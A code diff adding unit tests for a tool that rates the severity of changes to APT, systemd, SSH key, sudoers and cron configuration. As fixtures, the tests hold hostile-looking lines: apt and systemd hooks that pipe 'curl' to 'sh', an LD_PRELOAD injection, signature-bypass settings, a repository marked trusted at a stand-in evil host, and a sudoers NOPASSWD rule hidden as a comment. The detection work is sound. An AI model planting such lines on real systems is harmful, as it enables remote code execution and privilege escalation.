@@ -10070,5 +10070,176 @@ class ManualTests(unittest.TestCase):
             self.assertIn(f"!docs/{doc}", ignore)
 
 
+class ConfigSemanticsTests(unittest.TestCase):
+    """B77: la configuración crítica se compara por lo que el sistema hará con ella, no por sus bytes."""
+
+    UBUNTU = ("Types: deb\nURIs: http://archive.ubuntu.com/ubuntu/\nSuites: noble noble-updates\n"
+              "Components: main restricted universe\nSigned-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg\n")
+
+    def setUp(self):
+        from arx.modules import cfgsem
+        self.c = cfgsem
+
+    def _cl(self, group, before, after, **kw):
+        a = self.c.analyze(group, before, **kw) if before is not None else None
+        b = self.c.analyze(group, after, **kw) if after is not None else None
+        return self.c.classify(group, a, b)
+
+    # ── APT: fuentes ──
+    def test_an_empty_sources_list_appearing_changes_nothing(self):
+        # el crit del piloto en Debian 13: apt-daily-upgrade dejó un /etc/apt/sources.list vacío
+        self.assertIsNone(self._cl("apt_sources", None, ""))
+        self.assertIsNone(self._cl("apt_sources", None, "# comentario\n\n"))
+
+    def test_formatting_and_comments_change_nothing(self):
+        a = "deb [arch=amd64 signed-by=/k.gpg] https://ex.org/repo stable main\n"
+        b = "# repo\ndeb  [ signed-by=/k.gpg  arch=amd64 ]   https://EX.org/repo/  stable   main  # fin\n"
+        self.assertIsNone(self._cl("apt_sources", a, b))
+
+    def test_one_line_and_deb822_mean_the_same(self):
+        one = self.c.apt_sources("deb [signed-by=/k.gpg] https://ex.org/r stable main contrib\n")
+        d822 = self.c.apt_sources("Types: deb\nURIs: https://ex.org/r\nSuites: stable\nComponents: contrib main\n"
+                                  "Signed-By: /k.gpg\n", deb822=True)
+        self.assertTrue(one.ok and d822.ok)
+        self.assertEqual(one.canon, d822.canon)
+
+    def test_a_trusted_repository_is_critical(self):
+        ch = self._cl("apt_sources", "", "deb [trusted=yes] http://evil.example/ ./\n")
+        self.assertEqual(ch.sev, "crit")
+        ch = self.c.classify("apt_sources", self.c.apt_sources(self.UBUNTU, deb822=True),
+                             self.c.apt_sources(self.UBUNTU + "\nTypes: deb\nURIs: http://x.example/\nSuites: s\n"
+                                                "Components: main\nAllow-Insecure: yes\n", deb822=True))
+        self.assertEqual(ch.sev, "crit")
+
+    def test_a_new_repository_is_high_and_says_whether_it_is_pinned_to_a_key(self):
+        signed = self._cl("apt_sources", "", "deb [signed-by=/usr/share/keyrings/d.gpg] https://download.docker.com/linux/ubuntu noble stable\n")
+        self.assertEqual(signed.sev, "high")
+        unsigned = self._cl("apt_sources", "", "deb https://ppa.example/ubuntu noble main\n")
+        self.assertEqual(unsigned.sev, "high")
+        self.assertNotEqual(signed.summary.split(":")[0], unsigned.summary.split(":")[0])  # dice que no va atado a una clave
+
+    def test_component_change_is_medium_and_removal_low(self):
+        base = "deb [signed-by=/k] https://ex.org/r stable main\n"
+        self.assertEqual(self._cl("apt_sources", base, base.replace("main", "main contrib")).sev, "med")
+        self.assertEqual(self._cl("apt_sources", base, "").sev, "low")
+
+    def test_a_disabled_deb822_stanza_is_not_a_repository(self):
+        off = self.UBUNTU.replace("Types: deb", "Enabled: no\nTypes: deb")
+        self.assertEqual(self.c.apt_sources(off, deb822=True).canon, ())
+
+    def test_inline_signed_by_key_is_reduced_to_its_hash(self):
+        text = ("Types: deb\nURIs: https://ex.org/r\nSuites: s\nComponents: main\nSigned-By:\n"
+                " -----BEGIN PGP PUBLIC KEY BLOCK-----\n .\n mQINBGZ\n -----END PGP PUBLIC KEY BLOCK-----\n")
+        p = self.c.apt_sources(text, deb822=True)
+        self.assertTrue(p.ok)
+        self.assertTrue(p.canon[0][4].startswith("inline:"))
+
+    def test_unreadable_sources_are_never_ignored(self):
+        for bad in ("deb\n", "garbage line here\n", "a\x00b", "x" * (self.c.MAX_TEXT + 1)):
+            p = self.c.apt_sources(bad)
+            self.assertFalse(p.ok, bad[:20])
+            ch = self.c.classify("apt_sources", self.c.apt_sources("deb [signed-by=/k] https://e/r s m\n"), p)
+            self.assertEqual(ch.sev, "high")
+
+    # ── APT: apt.conf ──
+    def test_apt_hooks_and_signature_bypass_are_critical(self):
+        for text in ('DPkg::Post-Invoke { "curl -s http://x | sh"; };\n',
+                     'APT::Update::Pre-Invoke {"/tmp/x";};',
+                     'APT::Get::AllowUnauthenticated "true";',
+                     'Acquire::https::Verify-Peer "false";',
+                     'Acquire { AllowInsecureRepositories "1"; };',
+                     '#include /tmp/evil.conf\n'):
+            self.assertEqual(self._cl("apt_conf", "", text).sev, "crit", text)
+
+    def test_ordinary_apt_settings_are_low_and_formatting_nothing(self):
+        self.assertEqual(self._cl("apt_conf", 'APT::Periodic::Update-Package-Lists "1";',
+                                  'APT::Periodic::Update-Package-Lists "0";').sev, "low")
+        self.assertEqual(self._cl("apt_conf", "", 'APT::Get::AllowUnauthenticated "false";').sev, "low")
+        self.assertIsNone(self._cl("apt_conf", 'APT { Periodic { Unattended-Upgrade "1"; }; };',
+                                   '// auto\nAPT::Periodic::Unattended-Upgrade "1"; /* x */\n'))
+
+    def test_an_existing_package_hook_unchanged_is_quiet(self):
+        hook = 'DPkg::Post-Invoke { "if [ -d /var/lib/update-notifier ]; then touch /x; fi"; };\n'
+        self.assertIsNone(self._cl("apt_conf", hook, "// comentario\n" + hook))
+
+    def test_broken_apt_conf_is_unreadable(self):
+        for bad in ('APT { Get { "x";', 'a b c "v";', "}}}"):
+            self.assertFalse(self.c.apt_conf(bad).ok, bad)
+
+    # ── systemd ──
+    def test_a_drop_in_that_runs_something_is_high(self):
+        ch = self._cl("systemd", None, "[Service]\nExecStartPre=/usr/bin/curl -s http://x/p.sh | sh\n")
+        self.assertEqual(ch.sev, "high")
+        ch = self._cl("systemd", "[Service]\nExecStart=/usr/sbin/sshd -D\n",
+                      "[Service]\nExecStart=/usr/sbin/sshd -D\nEnvironment=LD_PRELOAD=/tmp/x.so\n")
+        self.assertEqual(ch.sev, "high")
+
+    def test_description_change_is_medium_formatting_nothing_removal_medium(self):
+        a = "[Unit]\nDescription=web\n[Service]\nExecStart=/usr/bin/web\n"
+        self.assertEqual(self._cl("systemd", a, a.replace("web\n[", "web server\n[")).sev, "med")
+        self.assertIsNone(self._cl("systemd", a, "# c\n[Unit]\nDescription = web\n\n[Service]\nExecStart=/usr/bin/web\n"))
+        self.assertEqual(self._cl("systemd", a, None).sev, "med")
+
+    def test_repeated_exec_lines_keep_their_order(self):
+        a = "[Service]\nExecStartPre=/a\nExecStartPre=/b\n"
+        b = "[Service]\nExecStartPre=/b\nExecStartPre=/a\n"
+        self.assertEqual(self._cl("systemd", a, b).sev, "med")
+
+    # ── SSH ──
+    KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl")
+
+    def test_new_key_is_critical_for_root_high_for_users_and_comments_do_not_count(self):
+        self.assertEqual(self._cl("authorized_keys_root", "", self.KEY + " admin\n").sev, "crit")
+        self.assertEqual(self._cl("authorized_keys_users", "", self.KEY + "\n").sev, "high")
+        self.assertIsNone(self._cl("authorized_keys_root", self.KEY + " a@b\n", "# x\n" + self.KEY + " otro\n"))
+
+    def test_dropping_a_key_restriction_is_high_and_removal_low(self):
+        restricted = 'command="/usr/bin/backup",no-pty ' + self.KEY + "\n"
+        self.assertEqual(self._cl("authorized_keys_root", restricted, self.KEY + "\n").sev, "high")
+        self.assertEqual(self._cl("authorized_keys_root", self.KEY + "\n", "").sev, "low")
+        self.assertEqual(self._cl("authorized_keys_root", "", "esto no es una clave\n").sev, "med")
+
+    def test_fingerprint_matches_openssh(self):
+        if not shutil.which("ssh-keygen"):
+            self.skipTest("sin ssh-keygen")
+        import subprocess
+        with tempfile.TemporaryDirectory() as d:
+            subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", f"{d}/k"], check=True)
+            pub = open(f"{d}/k.pub").read()
+            want = subprocess.run(["ssh-keygen", "-lf", f"{d}/k.pub"], capture_output=True, text=True).stdout.split()[1]
+        self.assertEqual(self.c.authorized_keys(pub).canon[0][2], want)
+
+    # ── sudoers, cron ──
+    def test_a_sudoers_rule_for_a_numeric_uid_is_not_a_comment(self):
+        hidden = "#1000 ALL=(ALL) NOPASSWD: ALL\n"
+        self.assertEqual(self._cl("sudoers_d", "", hidden).sev, "crit")
+        self.assertIsNone(self._cl("cron", "", hidden))  # en cron sí es un comentario
+        self.assertEqual(self.c.lines("@includedir /etc/sudoers.d\n#includedir /x\n", sudoers=True).canon,
+                         ("@includedir /etc/sudoers.d", "#includedir /x"))
+
+    def test_sudoers_order_matters_and_cron_additions_are_high(self):
+        a = "u ALL=(ALL) ALL\nu ALL=(ALL) NOPASSWD: /usr/bin/apt\n"
+        b = "u ALL=(ALL) NOPASSWD: /usr/bin/apt\nu ALL=(ALL) ALL\n"
+        self.assertEqual(self._cl("sudoers", a, b).sev, "high")
+        self.assertEqual(self._cl("cron", "", "* * * * * root /tmp/x\n").sev, "high")
+        self.assertEqual(self._cl("cron", "* * * * * root /tmp/x\n", "").sev, "low")
+
+    # ── robustez ──
+    def test_hostile_input_never_raises(self):
+        import random
+        rnd = random.Random(77)
+        alphabet = "deb[]=#{}\";:\\ \n\t/ABCxyz-.\x00é\U0001f600"
+        for group in ("apt_sources", "apt_conf", "systemd", "authorized_keys_root", "sudoers", "cron", "apt_keys"):
+            for _ in range(250):
+                text = "".join(rnd.choice(alphabet) for _ in range(rnd.randint(0, 400)))
+                for deb822 in (False, True):
+                    p = self.c.analyze(group, text, deb822=deb822)
+                    self.assertIsInstance(p, self.c.Parsed)
+                    self.c.classify(group, None, p)
+                    self.c.classify(group, p, None)
+        self.assertFalse(self.c.apt_conf("{" * 5000).ok)
+        self.assertTrue(self.c.analyze("apt_keys", b"\x99\x01binary").ok)
+
+
 if __name__ == "__main__":
     unittest.main()
